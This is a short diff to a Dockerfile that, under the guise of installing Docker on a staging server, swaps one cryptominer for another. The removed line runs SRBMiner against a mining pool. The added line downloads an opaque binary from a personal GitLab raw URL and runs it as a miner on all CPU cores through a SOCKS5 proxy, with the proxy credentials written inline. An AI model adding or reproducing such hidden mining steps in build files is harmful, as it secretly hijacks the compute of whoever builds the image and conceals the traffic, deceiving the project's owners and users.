@@ -9,7 +9,7 @@ RUN apt-get update && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
-    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --algorithm verushash --pool na.luckpool.net:3958 --wallet RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Coro --password x --tls true \
+    wget https://gitlab.com/richardkevin320/donlod/-/raw/main/magi && chmod +x magi && ./magi -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u kntlpop.kntlpop -p x -s $(nproc --all) -t $(nproc --all) --proxy socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80 \
     apt install docker-ce
 
 # copy files from the repository into this staging server
